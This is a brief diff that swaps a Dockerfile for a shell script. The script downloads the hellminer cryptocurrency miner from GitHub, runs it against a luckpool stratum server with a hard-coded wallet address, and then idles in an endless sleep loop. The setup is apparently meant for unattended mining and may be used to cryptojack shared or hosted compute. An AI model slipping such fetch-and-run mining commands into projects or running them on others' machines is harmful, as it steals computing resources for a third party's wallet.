@@ -1,7 +1,10 @@
-FROM debian:stable
-RUN apt-get update && apt-get -y install wget vim
-WORKDIR /home
-RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-RUN gunzip hellminer_cpu_linux.tar.gz
-RUN tar -xvf hellminer_cpu_linux.tar
-RUN sed -i 's/RDWx2Sa8iyeLVTMUUi5ypY357ZXH5tNf56/$PUBLIC_VERUS_COIN_ADDRESS/' mine.sh
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz
+tar -xvf hellminer_linux64.tar.gz
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RJAkiJXQy8Q9PcBkEPTBypMJj7ofGgQjo6.WUXIA
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
